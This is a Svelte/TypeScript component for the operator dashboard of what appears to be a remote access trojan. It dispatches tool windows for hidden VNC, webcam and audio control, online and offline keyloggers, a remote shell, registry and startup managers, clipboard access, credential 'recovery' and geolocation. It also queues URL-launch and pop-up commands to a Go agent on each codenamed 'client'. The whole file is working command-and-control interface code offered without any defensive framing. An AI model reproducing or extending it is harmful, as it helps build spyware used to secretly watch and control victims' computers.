<script lang="ts">
	import { browser } from '$app/environment';
	import { goto } from '$app/navigation';
	import { resolve } from '$app/paths';
	import { createEventDispatcher, onMount } from 'svelte';
	import type { ComponentType } from 'svelte';
	import * as Dialog from '$lib/components/ui/dialog/index.js';
	import MovableWindow from '$lib/components/ui/movablewindow/MovableWindow.svelte';
	import { Button } from '$lib/components/ui/button/index.js';
	import { Input } from '$lib/components/ui/input/index.js';
	import { Label } from '$lib/components/ui/label/index.js';
	import { Badge } from '$lib/components/ui/badge/index.js';
	import { Textarea } from '$lib/components/ui/textarea/index.js';
	import {
		Select,
		SelectTrigger,
		SelectContent,
		SelectItem
	} from '$lib/components/ui/select/index.js';
	import {
		Card,
		CardContent,
		CardDescription,
		CardHeader,
		CardTitle
	} from '$lib/components/ui/card/index.js';
	import type { Client } from '$lib/data/clients';
	import { buildClientToolUrl, getClientTool, type DialogToolId } from '$lib/data/client-tools';
	import { notifyToolActivationCommand } from '$lib/utils/agent-commands.js';
	import AppVncWorkspace from '$lib/components/workspace/tools/app-vnc-workspace.svelte';
	import WebcamControlWorkspace from '$lib/components/workspace/tools/webcam-control-workspace.svelte';
	import AudioControlWorkspace from '$lib/components/workspace/tools/audio-control-workspace.svelte';
	import KeyloggerWorkspace from '$lib/components/workspace/tools/keylogger-workspace.svelte';
	import CmdWorkspace from '$lib/components/workspace/tools/cmd-workspace.svelte';
	import FileManagerWorkspace from '$lib/components/workspace/tools/file-manager-workspace.svelte';
	import TaskManagerWorkspace from '$lib/components/workspace/tools/task-manager-workspace.svelte';
	import RegistryManagerWorkspace from '$lib/components/workspace/tools/registry-manager-workspace.svelte';
	import StartupManagerWorkspace from '$lib/components/workspace/tools/startup-manager-workspace.svelte';
	import ClipboardManagerWorkspace from '$lib/components/workspace/tools/clipboard-manager-workspace.svelte';
	import TcpConnectionsWorkspace from '$lib/components/workspace/tools/tcp-connections-workspace.svelte';
	import RecoveryWorkspace from '$lib/components/workspace/tools/recovery-workspace.svelte';
	import RemoteDesktopWorkspace from '$lib/components/workspace/tools/remote-desktop-workspace.svelte';
	import OptionsWorkspace from '$lib/components/workspace/tools/options-workspace.svelte';
	import ClientChatWorkspace from '$lib/components/workspace/tools/client-chat-workspace.svelte';
	import ReportWindowWorkspace from '$lib/components/workspace/tools/report-window-workspace.svelte';
	import IpGeolocationWorkspace from '$lib/components/workspace/tools/ip-geolocation-workspace.svelte';
	import EnvironmentVariablesWorkspace from '$lib/components/workspace/tools/environment-variables-workspace.svelte';
	import type { AgentSnapshot } from '../../../../shared/types/agent';

	const {
		toolId,
		client,
		agent = null
	} = $props<{
		toolId: DialogToolId;
		client: Client;
		agent?: AgentSnapshot | null;
	}>();

	const dispatch = createEventDispatcher<{ close: void }>();

	let open = $state(true);

	function handleOpenChange(next: boolean) {
		open = next;
	}

	function handleOpenChangeComplete(next: boolean) {
		if (!next) {
			dispatch('close');
		}
	}

	function requestClose() {
		open = false;
	}

	function handleFormSubmit(event: SubmitEvent) {
		event.preventDefault();
		requestClose();
	}

	const tool = getClientTool(toolId);
	const workspaceUrl = buildClientToolUrl(client.id, tool);

	const workspaceComponentMap = {
		'app-vnc': AppVncWorkspace,
		'remote-desktop': RemoteDesktopWorkspace,
		'webcam-control': WebcamControlWorkspace,
		'audio-control': AudioControlWorkspace,
		cmd: CmdWorkspace,
		'file-manager': FileManagerWorkspace,
		'task-manager': TaskManagerWorkspace,
		'registry-manager': RegistryManagerWorkspace,
		'startup-manager': StartupManagerWorkspace,
		'clipboard-manager': ClipboardManagerWorkspace,
		'tcp-connections': TcpConnectionsWorkspace,
		recovery: RecoveryWorkspace,
		options: OptionsWorkspace,
		'client-chat': ClientChatWorkspace,
		'report-window': ReportWindowWorkspace,
		'ip-geolocation': IpGeolocationWorkspace,
		'environment-variables': EnvironmentVariablesWorkspace
	} satisfies Partial<Record<DialogToolId, ComponentType>>;

	const keyloggerModes = {
		'keylogger-online': 'online',
		'keylogger-offline': 'offline',
		'keylogger-advanced-online': 'advanced-online'
	} as const;

	const workspaceToolIds = new Set<DialogToolId>([
		'app-vnc',
		'remote-desktop',
		'webcam-control',
		'audio-control',
		'keylogger-online',
		'keylogger-offline',
		'keylogger-advanced-online',
		'cmd',
		'file-manager',
		'task-manager',
		'registry-manager',
		'startup-manager',
		'clipboard-manager',
		'tcp-connections',
		'recovery',
		'options',
		'client-chat',
		'report-window',
		'ip-geolocation',
		'environment-variables'
	]);

	const workspaceRequiresAgent = new Set<DialogToolId>(['cmd']);

	const activeWorkspace = $derived(() => {
		const key = toolId as keyof typeof workspaceComponentMap;
		return workspaceComponentMap[key] ?? null;
	});
	const keyloggerMode = $derived(keyloggerModes[toolId as keyof typeof keyloggerModes]);
	const isWorkspaceDialog = $derived(workspaceToolIds.has(toolId));
	const missingAgent = $derived(workspaceRequiresAgent.has(toolId) && !agent);

	const windowWidth = $derived(isWorkspaceDialog ? 980 : 640);
	const windowHeight = $derived(isWorkspaceDialog ? 640 : 540);

	onMount(() => {
		if (!browser) {
			return;
		}
		notifyToolActivationCommand(client.id, toolId, {
			action: 'open',
			metadata: { surface: 'dialog' }
		});

		return () => {
			notifyToolActivationCommand(client.id, toolId, {
				action: 'close',
				metadata: { surface: 'dialog' }
			});
		};
	});

	const selectClasses =
		'flex h-9 w-full min-w-0 rounded-md border border-input bg-background px-3 py-1 text-sm shadow-xs ring-offset-background transition-[color,box-shadow] outline-none disabled:cursor-not-allowed disabled:opacity-50 focus-visible:border-ring focus-visible:ring-[3px] focus-visible:ring-ring/50 dark:bg-input/30';

	let noteText = $state(client.notes ?? '');
	let url = $state('https://');
	let urlContext = $state('');
	let messageTitle = $state('');
	let messageBody = $state('');
	type MessageStyle = 'info' | 'warning' | 'critical';
	let messageStyle = $state<MessageStyle>('info');

	let openUrlPending = $state(false);
	let openUrlError = $state<string | null>(null);

	const notesFieldId = `client-${client.id}-notes`;
	const openUrlFieldId = `client-${client.id}-open-url`;
	const openUrlContextId = `client-${client.id}-open-url-context`;
	const messageTitleId = `client-${client.id}-message-title`;
	const messageBodyId = `client-${client.id}-message-body`;
	const messageStyleId = `client-${client.id}-message-style`;

	const riskBadgeVariant =
		client.risk === 'High' ? 'destructive' : client.risk === 'Medium' ? 'secondary' : 'outline';

	function isValidHttpUrl(candidate: string): boolean {
		try {
			const parsed = new URL(candidate);
			return parsed.protocol === 'http:' || parsed.protocol === 'https:';
		} catch {
			return false;
		}
	}

	async function handleOpenUrlSubmit(event: SubmitEvent) {
		event.preventDefault();

		openUrlError = null;

		const trimmedUrl = url.trim();
		if (!trimmedUrl) {
			openUrlError = 'Destination URL is required';
			return;
		}

		if (!isValidHttpUrl(trimmedUrl)) {
			openUrlError = 'Enter a valid http:// or https:// URL';
			return;
		}

		if (!browser) {
			openUrlError = 'URL dispatch is unavailable in this environment';
			return;
		}

		openUrlPending = true;

		const note = urlContext.trim();
		const payload: { url: string; note?: string } = { url: trimmedUrl };
		if (note) {
			payload.note = note;
		}

		try {
			const response = await fetch(`/api/agents/${client.id}/commands`, {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				body: JSON.stringify({ name: 'open-url', payload })
			});

			if (!response.ok) {
				const message = (await response.text())?.trim();
				openUrlError = message || 'Failed to queue open URL request';
				return;
			}

			url = trimmedUrl;
			urlContext = note;
			requestClose();
		} catch (err) {
			openUrlError = err instanceof Error ? err.message : 'Failed to queue open URL request';
		} finally {
			openUrlPending = false;
		}
	}
</script>

<Dialog.Root
	bind:open
	onOpenChange={handleOpenChange}
	onOpenChangeComplete={handleOpenChangeComplete}
>
	<Dialog.Content
		class="pointer-events-none top-0 left-0 z-50 h-screen w-screen max-w-none translate-x-0 translate-y-0 border-none bg-transparent p-0 shadow-none"
		showCloseButton={false}
	>
		<div class="pointer-events-auto">
			<MovableWindow
				title={tool.title}
				width={windowWidth}
				height={windowHeight}
				onClose={requestClose}
			>
				<div class="flex h-full flex-col bg-background">
					<div
						class="border-b border-border/70 bg-muted/40 px-6 py-4 text-sm text-muted-foreground"
					>
						{tool.description}
					</div>

					{#if isWorkspaceDialog}
						<div class="flex-1 overflow-auto px-6 py-5">
							{#if keyloggerMode}
								<KeyloggerWorkspace {client} mode={keyloggerMode} />
							{:else if toolId === 'remote-desktop'}
								<RemoteDesktopWorkspace client={client} initialSession={null} />
							{:else if activeWorkspace}
								{@const Workspace = activeWorkspace}
								{#if toolId === 'cmd'}
									{#if missingAgent}
										<Card class="border-dashed">
											<CardHeader>
												<CardTitle>Agent snapshot required</CardTitle>
												<CardDescription>
													Re-open this tool from the clients table to access the latest agent
													metadata.
												</CardDescription>
											</CardHeader>
										</Card>
									{:else}
										<Workspace {client} agent={agent!} />
									{/if}
								{:else}
									<Workspace {client} />
								{/if}
							{:else}
								<Card class="border-dashed">
									<CardHeader>
										<CardTitle>{tool.title}</CardTitle>
										<CardDescription>
											Define the implementation contract here before wiring it to the Go agent.
										</CardDescription>
									</CardHeader>
									<CardContent class="space-y-4 text-sm text-muted-foreground">
										<p>
											modules / {tool.segments.join(' / ')} is currently using the default planning workspace.
										</p>
										<p>
											Add a dedicated workspace component for <span class="font-medium"
												>{tool.title}</span
											> to elevate the operator experience when you are ready.
										</p>
									</CardContent>
								</Card>
							{/if}
						</div>
					{:else if toolId === 'system-info'}
						<div class="flex flex-1 flex-col">
							<div class="flex-1 space-y-6 overflow-auto px-6 py-5">
								<div class="grid gap-3 text-sm">
									<div
										class="flex flex-wrap items-center gap-2 text-xs font-medium tracking-wide text-muted-foreground uppercase"
									>
										<span>Client</span>
										<span class="rounded-full bg-primary/10 px-2 py-0.5 text-primary">
											{client.codename}
										</span>
									</div>
									<div class="grid gap-3 sm:grid-cols-2">
										<div class="rounded-lg border border-border/70 bg-muted/40 p-4">
											<p class="text-xs font-medium tracking-wide text-muted-foreground uppercase">
												Hostname
											</p>
											<p class="mt-1 text-sm font-semibold text-foreground">{client.hostname}</p>
										</div>
										<div class="rounded-lg border border-border/70 bg-muted/40 p-4">
											<p class="text-xs font-medium tracking-wide text-muted-foreground uppercase">
												Address
											</p>
											<p class="mt-1 text-sm font-semibold text-foreground">{client.ip}</p>
										</div>
										<div class="rounded-lg border border-border/70 bg-muted/40 p-4">
											<p class="text-xs font-medium tracking-wide text-muted-foreground uppercase">
												Location
											</p>
											<p class="mt-1 text-sm font-semibold text-foreground">{client.location}</p>
										</div>
										<div class="rounded-lg border border-border/70 bg-muted/40 p-4">
											<p class="text-xs font-medium tracking-wide text-muted-foreground uppercase">
												Version
											</p>
											<p class="mt-1 text-sm font-semibold text-foreground">{client.version}</p>
										</div>
									</div>
								</div>

								<div class="grid gap-3 text-sm">
									<div class="flex flex-wrap items-center gap-2">
										<Badge variant="secondary" class="uppercase">{client.status}</Badge>
										<Badge variant={riskBadgeVariant}>Risk: {client.risk}</Badge>
										<Badge variant="outline">{client.os}</Badge>
									</div>
									<p class="text-sm text-muted-foreground">
										Last seen {client.lastSeen}. Platform: {client.platform.toUpperCase()}.
									</p>
								</div>

								{#if client.notes}
									<div class="rounded-lg border border-border/70 bg-background/60 p-4">
										<p class="text-xs font-medium tracking-wide text-muted-foreground uppercase">
											Active note
										</p>
										<p class="mt-2 text-sm leading-relaxed text-foreground">{client.notes}</p>
									</div>
								{/if}
							</div>
							<div
								class="flex items-center justify-end gap-2 border-t border-border/70 bg-muted/30 px-6 py-4"
							>
								<Dialog.Close>
									{#snippet child({ props })}
										<Button variant="outline" {...props}>Close</Button>
									{/snippet}
								</Dialog.Close>
							</div>
						</div>
					{:else if toolId === 'notes'}
						<form class="flex h-full flex-col" onsubmit={handleFormSubmit}>
							<div class="flex-1 space-y-6 overflow-auto px-6 py-5">
								<div class="grid gap-2">
									<Label for={notesFieldId}>Operational notes</Label>
									<Textarea
										id={notesFieldId}
										class="min-h-32"
										bind:value={noteText}
										placeholder="Add context, requirements, or follow-up actions for {client.codename}."
									/>
								</div>
								<div class="grid gap-2">
									<Label for={`${notesFieldId}-tags`}>Quick tags</Label>
									<Input id={`${notesFieldId}-tags`} placeholder="intel priority staging" />
									<p class="text-xs text-muted-foreground">
										Tags are not persisted yet; this scaffold highlights the planned structure.
									</p>
								</div>
							</div>
							<div
								class="flex items-center justify-end gap-2 border-t border-border/70 bg-muted/30 px-6 py-4"
							>
								<Dialog.Close>
									{#snippet child({ props })}
										<Button variant="outline" {...props}>Cancel</Button>
									{/snippet}
								</Dialog.Close>
								<Button type="submit">Save draft</Button>
							</div>
						</form>
					{:else if toolId === 'open-url'}
						<form class="flex h-full flex-col" onsubmit={handleOpenUrlSubmit}>
							<div class="flex-1 space-y-6 overflow-auto px-6 py-5">
								<div class="grid gap-2">
									<Label for={openUrlFieldId}>Destination URL</Label>
									<Input
										id={openUrlFieldId}
										type="url"
										bind:value={url}
										placeholder="https://target.example.com"
										required
									/>
								</div>
								<div class="grid gap-2">
									<Label for={openUrlContextId}>Operator note</Label>
									<Textarea
										id={openUrlContextId}
										class="min-h-32"
										bind:value={urlContext}
										placeholder="Document why {client.codename} should open this link."
									/>
								</div>
								{#if openUrlError}
									<p class="text-sm text-destructive">{openUrlError}</p>
								{/if}
								<p class="text-xs text-muted-foreground">
									The request will stage in the task queue for {client.codename}. Confirmation flow
									and auditing hooks are planned here.
								</p>
							</div>
							<div
								class="flex items-center justify-end gap-2 border-t border-border/70 bg-muted/30 px-6 py-4"
							>
								<Dialog.Close>
									{#snippet child({ props })}
										<Button variant="outline" {...props}>Cancel</Button>
									{/snippet}
								</Dialog.Close>
								<Button type="submit" disabled={openUrlPending}>
									{#if openUrlPending}
										Queueing…
									{:else}
										Queue launch
									{/if}
								</Button>
							</div>
						</form>
					{:else}
						<form class="flex h-full flex-col" onsubmit={handleFormSubmit}>
							<div class="flex-1 space-y-6 overflow-auto px-6 py-5">
								<div class="grid gap-2">
									<Label for={messageTitleId}>Title</Label>
									<Input
										id={messageTitleId}
										bind:value={messageTitle}
										placeholder="System notice"
									/>
								</div>
								<div class="grid gap-2">
									<Label for={messageBodyId}>Message body</Label>
									<Textarea
										id={messageBodyId}
										class="min-h-32"
										bind:value={messageBody}
										placeholder="Detail the prompt to display on {client.codename}."
										required
									/>
								</div>
								<div class="grid gap-2">
									<Label for={messageStyleId}>Style</Label>
									<Select type="single" bind:value={messageStyle}>
										<SelectTrigger id={messageStyleId} class={selectClasses} />
										<SelectContent>
											<SelectItem value="info">Information</SelectItem>
											<SelectItem value="warning">Warning</SelectItem>
											<SelectItem value="critical">Critical</SelectItem>
										</SelectContent>
									</Select>
								</div>
								<p class="text-xs text-muted-foreground">
									Delivery styling and acknowledgement capture will integrate here in a subsequent
									iteration.
								</p>
							</div>
							<div
								class="flex items-center justify-end gap-2 border-t border-border/70 bg-muted/30 px-6 py-4"
							>
								<Dialog.Close>
									{#snippet child({ props })}
										<Button variant="outline" {...props}>Cancel</Button>
									{/snippet}
								</Dialog.Close>
								<Button type="submit">Queue message</Button>
							</div>
						</form>
					{/if}
				</div>
			</MovableWindow>
		</div>
	</Dialog.Content>
</Dialog.Root>
